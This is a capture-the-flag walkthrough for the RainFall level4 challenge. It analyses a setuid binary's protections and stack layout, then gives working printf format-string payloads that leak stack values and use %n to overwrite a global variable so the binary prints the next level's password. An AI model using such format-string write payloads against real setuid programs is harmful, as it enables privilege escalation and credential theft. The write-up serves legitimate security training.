# RainFall (level4)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/level4/level4`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level4`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level4`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level4
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 /home/user/level4/level4
```

These describe the binary's privileges.
|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with level5's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are nonexecutable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

Similary to [level3](../level3/walkthrough.md), the program shows a non-standard libc `printf()` usage that violates the specifications of the related [man-page](https://man7.org/linux/man-pages/man3/printf.3.html).

In the following explanations, we will assume you have read the previous [walkthrough.md](../level3/walkthrough.md).

## Vulnerability analysis

Static analysis of [source.c](./source.c) shows the following section.
```c
if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
}
```

### Intent

We wish to identify the variable `m` and set its value to 16930116 *(0x1025544)*, satisfying the privilege escalation condition.

### Static Storage

`m` is declared in the [ELF .bss section](https://en.wikipedia.org/wiki/.bss) thus is a global variable:  
- It's address is `0x08049810`  
- In **little-endian hex** escape sequence: `\x10\x98\x04\x08`.  
- In **little-endian oct** escape sequence: `\020\230\004\010`.
```sh
$ objdump -t ./level4 | grep --word-regexp "m"
08049810 g     O .bss	00000004              m
```

### Heap

Some of the program's function calls are in unecessary wrappers.
After the `printf()` call, the stack frames would ressemble something like this.
```ruby
      HIGHER MEMORY ADDRESSES     
+--------------------------------+
|       n's return address       | (4 bytes)
+--------------------------------+ <--- n's Stack Frame start (@ 0xbffff734)
|    main's stack base pointer   | (4 bytes)
+--------------------------------+ (@ 0xbffff730)
| |               |              |
| |               |              |
| |               |              |
| |     buffer    | (520 bytes)  |
| |               |              |
| |               |              |
| |               |              | (536 bytes)
| +---------------+ (0xbffff520) |
| |               |              |
| |     unused    | (12 bytes)   |
| |               |              |
| +---------------+              |
| |   buffer ptr  | (4 bytes)    |
+--------------------------------+ (@ 0xbffff518)
|       p's return address       | (4 bytes)
+--------------------------------+ <--- p's Stack Frame start (@ 0xbffff514)
|     n's stack base pointer     | (4 bytes)
+--------------------------------+ (@ 0xbffff510)
| |               |              |
| |   alignment   | (20 bytes)   |
| |               |              | (24 bytes)
| +---------------+              |
| |   buffer ptr  | (4 bytes)    |
+--------------------------------+ (@ 0xbffff4f8)
|     printf's return address    | (4 bytes)
+--------------------------------+ <--- printf's Stack Frame start (@ 0xbffff4f4)
|     p's stack base pointer     | (4 bytes)
+--------------------------------+ (@ 0xbffff4f0)
|                                |
|     printf local variables     |
|               ...              |
|                                |
      LOWER MEMORY ADDRESSES      
```

### Heap

No user-defined functions request space on the heap. However, `printf()` calls may occasionally trigger `malloc()` depending on the arguments. Since we do not intend to use heap allocation, we will ignore this for now.

## Exploit

Using the same strategy as in [level3](../level3/walkthrough.md), we can build a payload to assign the expected value to `m`.

First let's identify where the buffer starts 
```sh
# We skip 12 words: (20+4+4+16) / 4 = 12
$ printf "%b\n" "\257\276\255\336%12\$p" | ./level4
����0xdeadbeaf
```

In the same fashion as the previous exercice, we assign the value to the target address by writing the required amount of characters.
```sh
# We write a total of 16930116 characters (4 + 16930112) to assign it to target address.
$ printf "%b\n" "\020\230\004\010%16930112c%12\$n" | ./level4
```

And there it is.